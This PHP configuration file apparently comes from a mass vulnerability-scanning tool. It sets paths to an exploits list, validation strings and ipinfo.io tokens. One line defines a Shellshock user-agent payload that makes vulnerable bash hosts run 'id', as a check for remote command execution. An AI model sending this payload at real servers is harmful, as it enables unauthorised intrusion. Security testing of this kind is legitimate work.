<?php
##########################################################################################
#Setting VALUES $_SESSION['config']#######################################################
##########################################################################################
$_SESSION['config'] = [];
$_SESSION['validation'] = [];
$_SESSION['config']['version_script'] = '3.0';
$_SESSION['config']['codename'] = 'facada';
$_SESSION['config']['totas_urls'] = null;
$_SESSION['config']['contUrl'] = 0;
$_SESSION['config']['cont_email'] = 0;
$_SESSION['config']['cont_url'] = 0;
$_SESSION['config']['cont_valores'] = 0;
$_SESSION['config']['pwd'] = realpath(dirname(__FILE__));
##########################################################################################
#FILE MANAGEMENT EXPLOITS.################################################################
##########################################################################################
$_SESSION['config']['file_exploit_conf'] = "{$_SESSION['config']['pwd']}/../../resources/exploits.inurl";
##########################################################################################
#FOLDER WHERE WILL BE SAVED PROCESSES.####################################################
##########################################################################################
$_SESSION['config']['out_put_paste'] = "{$_SESSION['config']['pwd']}/../../output/";
##########################################################################################
#TRASH LIST URL-STRINGS###################################################################
##########################################################################################
$_SESSION['config']['trash_list'] = file_get_contents("{$_SESSION['config']['pwd']}/../../resources/trash_list.validation.inurl");
##########################################################################################
# USER-AGENT EXPLOIT SHELLSHOCK###########################################################
# (CVE-2014-6271,CVE-2014-6277,CVE-2014-6278,CVE-2014-7169,CVE-2014-7186,CVE-2014-7187)###
# is a vulnerability in GNU's bash shell that gives attackers access to run remote########
# commands on a vulnerable system.########################################################
##########################################################################################
$_SESSION['config']['user_agent_xpl'] = "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"";
##########################################################################################
#LINE PROCESS#############################################################################
##########################################################################################
$_SESSION['config']['line'] = "\n{$cor->whit}______________________________________________________________________________________________________________{$cor->end}";
##########################################################################################
#SETING STRINGS VALIDATION################################################################
##########################################################################################
$_SESSION['config']['string_validation_file'] = explode("\n",file_get_contents("{$_SESSION['config']['pwd']}/../../resources/strings.validation.inurl"));
foreach ($_SESSION['config']['string_validation_file'] as $str_validation):
    $validation_tmp = explode(';',$str_validation);
    if($validation_tmp[0]):
        $_SESSION['validation'][$validation_tmp[0]] = $validation_tmp[1];
    endif;
endforeach;
##########################################################################################
#OPEN FILE TOKENS IPINFO.IO###############################################################
##########################################################################################
$_SESSION['config']['token_ipinfo'] = explode("\n",file_get_contents("{$_SESSION['config']['pwd']}/../../resources/token.ipinfo.inurl"));
shuffle($_SESSION['config']['token_ipinfo']);